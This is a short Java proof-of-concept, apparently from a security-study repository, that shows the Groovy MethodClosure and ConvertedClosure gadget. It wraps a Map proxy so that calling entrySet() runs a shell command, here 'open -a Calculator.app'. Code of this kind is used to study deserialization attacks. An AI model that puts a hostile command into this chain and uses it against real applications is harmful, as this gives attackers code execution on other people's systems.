package com.t4rrega.injection.Code.Groovy;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.Proxy;
import java.util.Map;

public class Groovy1 {
    public static void main(String[] args) throws Exception{

        MethodClosure mc = new MethodClosure("open -a Calculator.app","execute");
        ConvertedClosure convertedClosure = new ConvertedClosure(mc,"entrySet");
        Map map = (Map) Proxy.newProxyInstance(Groovy1.class.getClassLoader(),new Class[]{Map.class},convertedClosure);
        map.entrySet();
    }
}
